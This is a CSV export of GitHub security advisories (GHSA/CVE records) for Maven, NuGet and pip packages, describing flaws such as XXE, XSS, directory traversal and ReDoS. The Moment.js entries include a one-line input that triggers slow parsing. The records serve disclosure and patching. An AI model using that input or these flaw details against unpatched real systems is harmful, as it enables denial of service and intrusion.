2796,13514,Moment.js,GHSA-wc69-rhjr-hc9g,CVE-2022-31129,https://github.com/advisories/GHSA-wc69-rhjr-hc9g,high,2022-07-06 18:38:49 UTC,Moment.js vulnerable to Inefficient Regular Expression Complexity,"### Impact

* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs
* noticeable slowdown is observed with inputs above 10k characters
* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks

### Patches
The problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.

### Workarounds
In general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.

### References
There is an excellent writeup of the issue here: https://github.com/moment/moment/pull/6015#issuecomment-1152961973=

### Details
The issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. `moment(""("".repeat(500000))` will take a few minutes to process, which is unacceptable.",nuget
2797,15847,moment,GHSA-wc69-rhjr-hc9g,CVE-2022-31129,https://github.com/advisories/GHSA-wc69-rhjr-hc9g,high,2022-07-06 18:38:49 UTC,Moment.js vulnerable to Inefficient Regular Expression Complexity,"### Impact

* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs
* noticeable slowdown is observed with inputs above 10k characters
* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks

### Patches
The problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.

### Workarounds
In general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.

### References
There is an excellent writeup of the issue here: https://github.com/moment/moment/pull/6015#issuecomment-1152961973=

### Details
The issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. `moment(""("".repeat(500000))` will take a few minutes to process, which is unacceptable.",npm
2798,34807,org.apache.santuario:xmlsec,GHSA-4p4w-6h54-g885,CVE-2013-4517,https://github.com/advisories/GHSA-4p4w-6h54-g885,moderate,2022-05-13 01:05:55 UTC,Improper Input Validation in Apache Santuario XML Security,"Apache Santuario XML Security for Java before 1.5.6, when applying Transforms, allows remote attackers to cause a denial of service (memory consumption) via crafted Document Type Definitions (DTDs), related to signatures.",maven
2799,36473,org.glassfish:javax.faces,GHSA-3m3r-82gc-53mj,CVE-2013-5855,https://github.com/advisories/GHSA-3m3r-82gc-53mj,moderate,2022-05-14 02:54:24 UTC,Improper Neutralization of Input During Web Page Generation in Mojarra,"Oracle Mojarra 2.2.x before 2.2.6 and 2.1.x before 2.1.28 does not perform appropriate encoding when a (1) <h:outputText> tag or (2) EL expression is used after a scriptor style block, which allows remote attackers to conduct cross-site scripting (XSS) attacks via application-specific vectors.",maven
2800,36131,org.owasp.esapi:esapi,GHSA-jcp9-796g-pv9p,CVE-2013-5679,https://github.com/advisories/GHSA-jcp9-796g-pv9p,low,2022-05-17 03:56:06 UTC,Missing Cryptographic Step in OWASP Enterprise Security API for Java,"The authenticated-encryption feature in the symmetric-encryption implementation in the OWASP Enterprise Security API (ESAPI) for Java 2.x before 2.1.0 does not properly resist tampering with serialized ciphertext, which makes it easier for remote attackers to bypass intended cryptographic protection mechanisms via an attack against authenticity in the default configuration, involving a null MAC and a zero MAC length.",maven
2801,19919,pip,GHSA-c5h8-cq4v-cvfm,CVE-2013-5123,https://github.com/advisories/GHSA-c5h8-cq4v-cvfm,moderate,2022-05-24 22:01:03 UTC,Improper Authentication in pip,"The mirroring support (-M, --use-mirrors) in Python Pip before 1.5 uses insecure DNS querying and authenticity checks which allows attackers to perform man-in-the-middle attacks.",pip
2802,15306,System.Private.Uri,GHSA-xhfc-gr8f-ffwc,CVE-2019-0980,https://github.com/advisories/GHSA-xhfc-gr8f-ffwc,high,2022-05-24 16:45:53 UTC,Denial of service in ASP.NET Core,"A denial of service vulnerability exists when .NET Framework or .NET Core improperly handle web requests, aka '.Net Framework and .Net Core Denial of Service Vulnerability'. This CVE ID is unique from CVE-2019-0820, CVE-2019-0981.",nuget
2803,15306,System.Private.Uri,GHSA-5f2m-466j-3848,CVE-2019-0981,https://github.com/advisories/GHSA-5f2m-466j-3848,high,2022-05-24 16:45:54 UTC,Denial of service in ASP.NET Core,"A denial of service vulnerability exists when .NET Framework or .NET Core improperly handle web requests, aka '.Net Framework and .Net Core Denial of Service Vulnerability'. This CVE ID is unique from CVE-2019-0820, CVE-2019-0980.",nuget
2804,37826,com.jamonapi:jamon,GHSA-qpr7-5m63-hq2c,CVE-2013-6235,https://github.com/advisories/GHSA-qpr7-5m63-hq2c,moderate,2022-05-14 02:54:05 UTC,Improper Neutralization of Input During Web Page Generation in JAMon,"Multiple cross-site scripting (XSS) vulnerabilities in JAMon (Java Application Monitor) 2.7 and earlier allow remote attackers to inject arbitrary web script or HTML via the (1) listenertype or (2) currentlistener parameter to mondetail.jsp or ArraySQL parameter to (3) mondetail.jsp, (4) jamonadmin.jsp, (5) sql.jsp, or (6) exceptions.jsp.",maven
2805,34577,org.apache.solr:solr-core,GHSA-j8qw-mwmv-28cg,CVE-2013-6397,https://github.com/advisories/GHSA-j8qw-mwmv-28cg,moderate,2022-05-17 04:04:29 UTC,Improper Limitation of a Pathname to a Restricted Directory in Apache Solr,"Directory traversal vulnerability in SolrResourceLoader in Apache Solr before 4.6 allows remote attackers to read arbitrary files via a .. (dot dot) or full pathname in the tr parameter to solr/select/, when the response writer (wt parameter) is set to XSLT.  NOTE: this can be leveraged using a separate XXE (XML eXternal Entity) vulnerability to allow access to files across restricted network boundaries.",maven
2806,13005,Microsoft.AspNetCore.App,GHSA-prrf-397v-83xh,CVE-2019-1075,https://github.com/advisories/GHSA-prrf-397v-83xh,moderate,2022-05-24 16:50:19 UTC,Open redirect in ASP.NET Core,"A spoofing vulnerability exists in ASP.NET Core that could lead to an open redirect, aka 'ASP.NET Core Spoofing Vulnerability'.",nuget
2807,34577,org.apache.solr:solr-core,GHSA-45w3-2hvv-pfxq,CVE-2013-6408,https://github.com/advisories/GHSA-45w3-2hvv-pfxq,moderate,2022-05-17 04:39:49 UTC,XML Injection in Apache Solr,"The DocumentAnalysisRequestHandler in Apache Solr before 4.3.1 does not properly use the EmptyEntityResolver, which allows remote attackers to have an unspecified impact via XML data containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-6407.",maven
2808,33912,org.springframework:spring-web,GHSA-xjrf-8x4f-43h4,CVE-2013-6430,https://github.com/advisories/GHSA-xjrf-8x4f-43h4,moderate,2022-05-05 00:29:18 UTC,Improper Neutralization of Input During Web Page Generation in Spring Framework,"The JavaScriptUtils.javaScriptEscape method in web/util/JavaScriptUtils.java in Spring MVC in Spring Framework before 3.2.2 does not properly escape certain characters, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a (1) line separator or (2) paragraph separator Unicode character or (3) left or (4) right angle bracket.",maven
2809,33912,org.springframework:spring-web,GHSA-g6hf-f9cq-q7w7,CVE-2013-6429,https://github.com/advisories/GHSA-g6hf-f9cq-q7w7,moderate,2022-05-13 01:02:39 UTC,Cross-Site Request Forgery in Spring Framework,"The SourceHttpMessageConverter in Spring MVC in Spring Framework before 3.2.5 and 4.0.0.M1 through 4.0.0.RC1 does not disable external entity resolution, which allows remote attackers to read arbitrary files, cause a denial of service, and conduct CSRF attacks via crafted XML, aka an XML External Entity (XXE) issue, and a different vulnerability than CVE-2013-4152 and CVE-2013-7315.",maven
2810,35270,org.opensaml:opensaml,GHSA-v723-58jv-2qc4,CVE-2013-6440,https://github.com/advisories/GHSA-v723-58jv-2qc4,moderate,2022-05-13 01:04:00 UTC,Exposure of Sensitive Information to an Unauthorized Actor in OpenSAML,"The (1) BasicParserPool, (2) StaticBasicParserPool, (3) XML Decrypter, and (4) SAML Decrypter in Shibboleth OpenSAML-Java before 2.6.1 set the expandEntityReferences property to true, which allows remote attackers to conduct XML external entity (XXE) attacks via a crafted XML DOCTYPE declaration.",maven
2811,34591,org.springframework:spring-oxm,GHSA-vp63-rrcm-9mph,CVE-2013-7315,https://github.com/advisories/GHSA-vp63-rrcm-9mph,moderate,2022-05-13 01:02:38 UTC,Missing XML Validation in Spring Framework,"The Spring MVC in Spring Framework before 3.2.4 and 4.0.0.M1 through 4.0.0.M2 does not disable external entity resolution for the StAX XMLInputFactory, which allows context-dependent attackers to read arbitrary files, cause a denial of service, and conduct CSRF attacks via crafted XML with JAXB, aka an XML External Entity (XXE) issue, and a different vulnerability than CVE-2013-4152.  NOTE: this issue was SPLIT from CVE-2013-4152 due to different affected versions.",maven
2812,34105,com.ning:async-http-client,GHSA-5c66-6h6g-6q6m,CVE-2013-7398,https://github.com/advisories/GHSA-5c66-6h6g-6q6m,moderate,2022-05-13 01:12:18 UTC,Insufficient Verification of Data Authenticity in Async Http Client,"main/java/com/ning/http/client/AsyncHttpClientConfig.java in Async Http Client (aka AHC or async-http-client) before 1.9.0 does not require a hostname match during verification of X.509 certificates, which allows man-in-the-middle attackers to spoof HTTPS servers via an arbitrary valid certificate.",maven
2813,34105,com.ning:async-http-client,GHSA-8h53-fjgg-g42g,CVE-2013-7397,https://github.com/advisories/GHSA-8h53-fjgg-g42g,moderate,2022-05-13 01:12:18 UTC,Insufficient Verification of Data Authenticity in Async Http Client,"Async Http Client (aka AHC or async-http-client) before 1.9.0 skips X.509 certificate verification unless both a keyStore location and a trustStore location are explicitly set, which allows man-in-the-middle attackers to spoof HTTPS servers by presenting an arbitrary certificate during use of a typical AHC configuration, as demonstrated by a configuration that does not send client certificates.",maven
2814,20407,Beaker,GHSA-3cwm-7jmm-774w,CVE-2013-7489,https://github.com/advisories/GHSA-3cwm-7jmm-774w,moderate,2022-05-05 00:29:41 UTC,Deserialization of Untrusted Data in Beaker,"The Beaker library through 1.11.0 for Python is affected by deserialization of untrusted data, which could lead to arbitrary code execution.",pip
2815,13005,Microsoft.AspNetCore.App,GHSA-23cv-jh4v-vffm,CVE-2020-0602,https://github.com/advisories/GHSA-23cv-jh4v-vffm,moderate,2022-05-24 17:06:16 UTC,Denial of service in ASP.NET Core,"A denial of service vulnerability exists when ASP.NET Core improperly handles web requests, aka 'ASP.NET Core Denial of Service Vulnerability'.",nuget
2816,15315,Microsoft.AspNetCore.SpaServices,GHSA-xr8f-59pp-rxxh,CVE-2019-1302,https://github.com/advisories/GHSA-xr8f-59pp-rxxh,moderate,2022-05-24 22:00:33 UTC,Elevation of privilege in ASP.NET Core,"An elevation of privilege vulnerability exists when a ASP.NET Core web application, created using vulnerable project templates, fails to properly sanitize web requests, aka 'ASP.NET Core Elevation Of Privilege Vulnerability'.",nuget
2817,13005,Microsoft.AspNetCore.App,GHSA-655q-9gvg-q4cm,CVE-2020-0603,https://github.com/advisories/GHSA-655q-9gvg-q4cm,high,2022-05-24 17:06:16 UTC,Remote code execution in ASP.NET Core,"A remote code execution vulnerability exists in ASP.NET Core software when the software fails to handle objects in memory.An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user, aka 'ASP.NET Core Remote Code Execution Vulnerability'.",nuget
2818,33936,org.springframework:spring-webmvc,GHSA-8cmm-qj8g-fcp6,CVE-2014-0054,https://github.com/advisories/GHSA-8cmm-qj8g-fcp6,moderate,2022-05-13 01:02:38 UTC,Cross-Site Request Forgery in Spring Framework,"The Jaxb2RootElementHttpMessageConverter in Spring MVC in Spring Framework before 3.2.8 and 4.0.0 before 4.0.2 does not disable external entity resolution, which allows remote attackers to read arbitrary files, cause a denial of service, and conduct CSRF attacks via crafted XML, aka an XML External Entity (XXE) issue.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-4152, CVE-2013-7315, and CVE-2013-6429.",maven
2819,34718,org.apache.cxf:cxf-core,GHSA-v45r-rj5x-hpg2,CVE-2014-0035,https://github.com/advisories/GHSA-v45r-rj5x-hpg2,moderate,2022-05-13 01:09:20 UTC,Cleartext Transmission of Sensitive Information in Apache CXF,"The SymmetricBinding in Apache CXF before 2.6.13 and 2.7.x before 2.7.10, when EncryptBeforeSigning is enabled and the UsernameToken policy is set to an EncryptedSupportingToken, transmits the UsernameToken in cleartext, which allows remote attackers to obtain sensitive information by sniffing the network.",maven
2820,34855,org.apache.cxf:cxf-rt-ws-security,GHSA-38x2-fp9m-87mx,CVE-2014-0034,https://github.com/advisories/GHSA-38x2-fp9m-87mx,moderate,2022-05-13 01:09:20 UTC,Improper Input Validation in Apache CXF,"The SecurityTokenService (STS) in Apache CXF before 2.6.12 and 2.7.x before 2.7.9 does not properly validate SAML tokens when caching is enabled, which allows remote attackers to gain access via an invalid SAML token.",maven
2821,12889,Microsoft.Owin,GHSA-hxrm-9w7p-39cc,CVE-2020-1045,https://github.com/advisories/GHSA-hxrm-9w7p-39cc,high,2022-05-24 17:27:57 UTC,Cookie parsing failure,"A security feature bypass vulnerability exists in the way Microsoft ASP.NET Core parses encoded cookie names.The ASP.NET Core cookie parser decodes entire cookie strings which could allow a malicious attacker to set a second cookie with the name being percent encoded.The security update addresses the vulnerability by fixing the way the ASP.NET Core cookie parser handles encoded names., aka 'Microsoft ASP.NET Core Security Feature Bypass Vulnerability'.",nuget
2822,12937,Microsoft.AspNetCore.Http,GHSA-hxrm-9w7p-39cc,CVE-2020-1045,https://github.com/advisories/GHSA-hxrm-9w7p-39cc,high,2022-05-24 17:27:57 UTC,Cookie parsing failure,"A security feature bypass vulnerability exists in the way Microsoft ASP.NET Core parses encoded cookie names.The ASP.NET Core cookie parser decodes entire cookie strings which could allow a malicious attacker to set a second cookie with the name being percent encoded.The security update addresses the vulnerability by fixing the way the ASP.NET Core cookie parser handles encoded names., aka 'Microsoft ASP.NET Core Security Feature Bypass Vulnerability'.",nuget
2823,34025,org.springframework.security:spring-security-core,GHSA-gv9v-c375-hvmg,CVE-2014-0097,https://github.com/advisories/GHSA-gv9v-c375-hvmg,high,2022-05-13 01:01:04 UTC,Improper Authentication in Spring Security,The ActiveDirectoryLdapAuthenticator in Spring Security 3.2.0 to 3.2.1 and 3.1.0 to 3.1.5 does not check the password length. If the directory allows anonymous binds then it may incorrectly authenticate a user who supplies an empty password.,maven
2824,34092,xalan:xalan,GHSA-rc2w-r4jq-7pfx,CVE-2014-0107,https://github.com/advisories/GHSA-rc2w-r4jq-7pfx,high,2022-05-13 01:05:38 UTC,Improper Authorization in Apache Xalan-Java,"The TransformerFactory in Apache Xalan-Java before 2.7.2 does not properly restrict access to certain properties when FEATURE_SECURE_PROCESSING is enabled, which allows remote attackers to bypass expected restrictions and load arbitrary classes or access external resources via a crafted (1) xalan:content-header, (2) xalan:entities, (3) xslt:content-header, or (4) xslt:entities property, or a Java property that is bound to the XSLT 1.0 system-property function.",maven
2825,34718,org.apache.cxf:cxf-core,GHSA-5wqf-h3r3-gxvh,CVE-2014-0109,https://github.com/advisories/GHSA-5wqf-h3r3-gxvh,moderate,2022-05-13 01:09:20 UTC,Uncontrolled Resource Consumption in Apache CXF,"Apache CXF before 2.6.14 and 2.7.x before 2.7.11 allows remote attackers to cause a denial of service (memory consumption) via a large request with the Content-Type set to text/html to a SOAP endpoint, which triggers an error.",maven
2826,34718,org.apache.cxf:cxf-core,GHSA-5xf9-3v63-ww6f,CVE-2014-0110,https://github.com/advisories/GHSA-5xf9-3v63-ww6f,moderate,2022-05-13 01:09:20 UTC,Uncontrolled Resource Consumption in Apache CXF,Apache CXF before 2.6.14 and 2.7.x before 2.7.11 allows remote attackers to cause a denial of service (/tmp disk consumption) via a large invalid SOAP message.,maven
2827,36708,org.jolokia:jolokia-core,GHSA-fjhw-8222-g2hg,CVE-2014-0168,https://github.com/advisories/GHSA-fjhw-8222-g2hg,moderate,2022-05-17 04:31:39 UTC,Cross-Site Request Forgery in Jolokia,Cross-site request forgery (CSRF) vulnerability in Jolokia before 1.2.1 allows remote attackers to hijack the authentication of users for requests that execute MBeans methods via a crafted web page.,maven
2828,36192,org.apache.karaf:apache-karaf,GHSA-m6g3-xq5q-4hg9,CVE-2014-0219,https://github.com/advisories/GHSA-m6g3-xq5q-4hg9,moderate,2022-05-14 01:42:28 UTC,Improper Input Validation in Apache Karaf,"Apache Karaf before 4.0.10 enables a shutdown port on the loopback interface, which allows local users to cause a denial of service (shutdown) by sending a shutdown command to all listening high ports.",maven
2829,33936,org.springframework:spring-webmvc,GHSA-f93f-g33r-8pcp,CVE-2014-0225,https://github.com/advisories/GHSA-f93f-g33r-8pcp,high,2022-05-13 01:02:39 UTC,Improper Restriction of XML External Entity Reference in Spring Framework,"When processing user provided XML documents, the Spring Framework 4.0.0 to 4.0.4, 3.0.0 to 3.2.8, and possibly earlier unsupported versions did not disable by default the resolution of URI references in a DTD declaration. This enabled an XXE attack.",maven
2830,34046,org.apache.hadoop:hadoop-common,GHSA-9r7g-325h-mxrm,CVE-2014-0229,https://github.com/advisories/GHSA-9r7g-325h-mxrm,moderate,2022-05-17 02:53:20 UTC,Improper Authentication in Apache Hadoop,"Apache Hadoop 0.23.x before 0.23.11 and 2.x before 2.4.1, as used in Cloudera CDH 5.0.x before 5.0.2, do not check authorization for the (1) refreshNamenodes, (2) deleteBlockPool, and (3) shutdownDatanode HDFS admin commands, which allows remote authenticated users to cause a denial of service (DataNodes shutdown) or perform unnecessary operations by issuing a command.",maven
2831,35403,org.fitnesse:fitnesse,GHSA-mpx3-mx2p-9gv3,CVE-2014-1216,https://github.com/advisories/GHSA-mpx3-mx2p-9gv3,high,2022-05-17 04:46:05 UTC,Improper Neutralization of Special Elements used in a Command in FitNesse Wiki,"FitNesse Wiki 20131110, 20140201, and earlier allows remote attackers to execute arbitrary commands by defining a COMMAND_PATTERN and TEST_RUNNER in the pageContent parameter when editing a page.",maven
2832,19836,Jinja2,GHSA-8r7q-cvjq-x353,CVE-2014-1402,https://github.com/advisories/GHSA-8r7q-cvjq-x353,moderate,2022-05-14 04:04:14 UTC,Incorrect Privilege Assignment in Jinja2,"The default configuration for bccache.FileSystemBytecodeCache in Jinja2 before 2.7.2 does not properly create temporary files, which allows local users to gain privileges via a crafted .cache file with a name starting with __jinja2_ in /tmp.",pip
2833,19826,requests,GHSA-cfj3-7x9c-4p3h,CVE-2014-1829,https://github.com/advisories/GHSA-cfj3-7x9c-4p3h,moderate,2022-05-17 03:49:35 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Requests,Requests (aka python-requests) before 2.3.0 allows remote servers to obtain a netrc password by reading the Authorization header in a redirected request.,pip
2834,19826,requests,GHSA-652x-xj99-gmcc,CVE-2014-1830,https://github.com/advisories/GHSA-652x-xj99-gmcc,moderate,2022-05-14 02:09:22 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Requests,Requests (aka python-requests) before 2.3.0 allows remote servers to obtain sensitive information by reading the Proxy-Authorization header in a redirected request.,pip
2835,20682,logilab-common,GHSA-rr52-wg7f-8875,CVE-2014-1838,https://github.com/advisories/GHSA-rr52-wg7f-8875,moderate,2022-05-14 02:09:22 UTC,Improper Link Resolution Before File Access in logilab-commons,The (1) extract_keys_from_pdf and (2) fill_pdf functions in pdf_ext.py in logilab-common before 0.61.0 allows local users to overwrite arbitrary files and possibly have other unspecified impact via a symlink attack on /tmp/toto.fdf.,pip
2836,20682,logilab-common,GHSA-g5m2-22h2-rr3j,CVE-2014-1839,https://github.com/advisories/GHSA-g5m2-22h2-rr3j,moderate,2022-05-14 02:09:23 UTC,Creation of Temporary File With Insecure Permissions in logilab-commons,"The Execute class in shellutils in logilab-common before 0.61.0 uses tempfile.mktemp, which allows local users to have an unspecified impact by pre-creating the temporary file.",pip
2837,33936,org.springframework:spring-webmvc,GHSA-ff7p-jqjm-v66h,CVE-2014-1904,https://github.com/advisories/GHSA-ff7p-jqjm-v66h,moderate,2022-05-14 01:14:55 UTC,Improper Neutralization of Input During Web Page Generation in Spring Framework,Cross-site scripting (XSS) vulnerability in web/servlet/tags/form/FormTag.java in Spring MVC in Spring Framework 3.0.0 before 3.2.8 and 4.0.0 before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via the requested URI in a default action.,maven
2838,37652,org.codehaus.castor:castor,GHSA-jwwr-fjgh-cv2x,CVE-2014-3004,https://github.com/advisories/GHSA-jwwr-fjgh-cv2x,moderate,2022-05-13 01:05:37 UTC,Improper Restriction of XML External Entity Reference in Castor,The default configuration for the Xerces SAX Parser in Castor before 1.3.3 allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted XML document.,maven
2839,34676,org.jboss.resteasy:resteasy-client,GHSA-qjpq-5pq3-43rr,CVE-2014-3490,https://github.com/advisories/GHSA-qjpq-5pq3-43rr,high,2022-05-14 01:18:38 UTC,Incorrect Privilege Assignment in RESTEasy,"RESTEasy 2.3.1 before 2.3.8.SP2 and 3.x before 3.0.9, as used in Red Hat JBoss Enterprise Application Platform (EAP) 6.3.0, does not disable external entities when the resteasy.document.expand.entity.references parameter is set to false, which allows remote attackers to read arbitrary files and have other unspecified impact via unspecified vectors, related to an XML External Entity (XXE) issue.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-0818.",maven
2840,34081,org.apache.poi:poi,GHSA-q56h-jjj6-52mf,CVE-2014-3529,https://github.com/advisories/GHSA-q56h-jjj6-52mf,moderate,2022-05-17 01:24:40 UTC,Improper Restriction of XML External Entity Reference in Apache POI,"The OPC SAX setup in Apache POI before 3.10.1 allows remote attackers to read arbitrary files via an OpenXML file containing an XML external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.",maven
2841,33948,org.hibernate:hibernate-validator,GHSA-845h-985r-jrqh,CVE-2014-3558,https://github.com/advisories/GHSA-845h-985r-jrqh,moderate,2022-05-14 01:18:38 UTC,Improper Authentication in Hibernate Validator,"ReflectionHelper (org.hibernate.validator.util.ReflectionHelper) in Hibernate Validator 4.1.0 before 4.2.1, 4.3.x before 4.3.2, and 5.x before 5.1.2 allows attackers to bypass Java Security Manager (JSM) restrictions and execute restricted reflection calls via a crafted application.",maven
2842,35045,org.apache.activemq:activemq-client,GHSA-3wfj-vh84-732p,CVE-2014-3576,https://github.com/advisories/GHSA-3wfj-vh84-732p,high,2022-05-14 01:14:52 UTC,Improper Neutralization of Special Elements used in an OS Command in Apache ActiveMQ,The processControlCommand function in broker/TransportConnection.java in Apache ActiveMQ before 5.11.0 allows remote attackers to cause a denial of service (shutdown) via a shutdown command.,maven
2843,33906,org.springframework:spring-core,GHSA-rhcg-rwhx-qj3j,CVE-2014-3578,https://github.com/advisories/GHSA-rhcg-rwhx-qj3j,moderate,2022-05-14 00:56:29 UTC,Improper Limitation of a Pathname to a Restricted Directory in Spring Framework,Directory traversal vulnerability in Pivotal Spring Framework 3.x before 3.2.9 and 4.0 before 4.0.5 allows remote attackers to read arbitrary files via a crafted URL.,maven
2844,34443,org.apache.cxf:cxf-rt-frontend-jaxrs,GHSA-gw5j-77f9-v2g2,CVE-2014-3584,https://github.com/advisories/GHSA-gw5j-77f9-v2g2,moderate,2022-05-13 01:09:20 UTC,Loop with Unreachable Exit Condition in Apache CXF,"The SamlHeaderInHandler in Apache CXF before 2.6.11, 2.7.x before 2.7.8, and 3.0.x before 3.0.1 allows remote attackers to cause a denial of service (infinite loop) via a crafted SAML token in the authorization header of a request to a JAX-RS service.",maven
2845,35045,org.apache.activemq:activemq-client,GHSA-4vhf-2hv7-8mrx,CVE-2014-3600,https://github.com/advisories/GHSA-4vhf-2hv7-8mrx,critical,2022-05-14 01:14:52 UTC,Improper Restriction of XML External Entity Reference in Apache ActiveMQ,XML external entity (XXE) vulnerability in Apache ActiveMQ 5.x before 5.10.1 allows remote consumers to have unspecified impact via vectors involving an XPath based selector when dequeuing XML messages.,maven
2846,35270,org.opensaml:opensaml,GHSA-rm7v-gqfg-p2wc,CVE-2014-3603,https://github.com/advisories/GHSA-rm7v-gqfg-p2wc,moderate,2022-05-14 01:11:29 UTC,Improper Validation of Certificate with Host Mismatch in Shibboleth Identity Provider and OpenSAML Java,"The (1) HttpResource and (2) FileBackedHttpResource implementations in Shibboleth Identity Provider (IdP) before 2.4.1 and OpenSAML Java 2.6.2 do not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",maven
2847,38310,ca.juliusdavies:not-yet-commons-ssl,GHSA-cmxj-wx9v-52qr,CVE-2014-3604,https://github.com/advisories/GHSA-cmxj-wx9v-52qr,moderate,2022-05-14 03:59:54 UTC,Improper Validation of Certificate with Host Mismatch in Not Yet Commons SSL,"Certificates.java in Not Yet Commons SSL before 0.3.15 does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",maven
2848,33936,org.springframework:spring-webmvc,GHSA-hhm4-hwq6-3c6w,CVE-2014-3625,https://github.com/advisories/GHSA-hhm4-hwq6-3c6w,moderate,2022-05-13 01:02:39 UTC,Improper Limitation of a Pathname to a Restricted Directory in Spring Framework,"Directory traversal vulnerability in Pivotal Spring Framework 3.0.4 through 3.2.x before 3.2.12, 4.0.x before 4.0.8, and 4.1.x before 4.1.2 allows remote attackers to read arbitrary files via unspecified vectors, related to static resource handling.",maven
2849,35045,org.apache.activemq:activemq-client,GHSA-72m6-23ff-7q26,CVE-2014-3612,https://github.com/advisories/GHSA-72m6-23ff-7q26,high,2022-05-14 01:14:52 UTC,Improper Authentication in Apache WSS4J,"The LDAPLoginModule implementation in the Java Authentication and Authorization Service (JAAS) in Apache ActiveMQ 5.x before 5.10.1 allows remote attackers to bypass authentication by logging in with an empty password and valid username, which triggers an unauthenticated bind. NOTE: this identifier has been SPLIT per ADT2 due to different vulnerability types. See CVE-2015-6524 for the use of wildcard operators in usernames.",maven
2850,38268,org.apache.wss4j:wss4j-ws-security-dom,GHSA-99v3-9x35-c5vf,CVE-2014-3623,https://github.com/advisories/GHSA-99v3-9x35-c5vf,moderate,2022-05-13 01:09:20 UTC,Improper Authentication in Apache WSS4J,"Apache WSS4J before 1.6.17 and 2.x before 2.0.2, as used in Apache CXF 2.7.x before 2.7.13 and 3.0.x before 3.0.2, when using TransportBinding, does not properly enforce the SAML SubjectConfirmation method security semantics, which allows remote attackers to conduct spoofing attacks via unspecified vectors.",maven
2851,35696,org.apache.ws.security:wss4j,GHSA-99v3-9x35-c5vf,CVE-2014-3623,https://github.com/advisories/GHSA-99v3-9x35-c5vf,moderate,2022-05-13 01:09:20 UTC,Improper Authentication in Apache WSS4J,"Apache WSS4J before 1.6.17 and 2.x before 2.0.2, as used in Apache CXF 2.7.x before 2.7.13 and 3.0.x before 3.0.2, when using TransportBinding, does not properly enforce the SAML SubjectConfirmation method security semantics, which allows remote attackers to conduct spoofing attacks via unspecified vectors.",maven
2852,34125,org.apache.hadoop:hadoop-client,GHSA-jpmf-8cj2-595g,CVE-2014-3627,https://github.com/advisories/GHSA-jpmf-8cj2-595g,moderate,2022-05-17 04:20:31 UTC,Improper Link Resolution Before File Access in Apache Hadoop,"The YARN NodeManager daemon in Apache Hadoop 0.23.0 through 0.23.11 and 2.x before 2.5.2, when using Kerberos authentication, allows remote cluster users to change the permissions of certain files to world-readable via a symlink attack in a public tar archive, which is not properly handled during localization, related to distributed cache.",maven
2853,14267,System.Private.ServiceModel,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2854,13256,System.ServiceModel.Security,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2855,13309,System.ServiceModel.Duplex,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
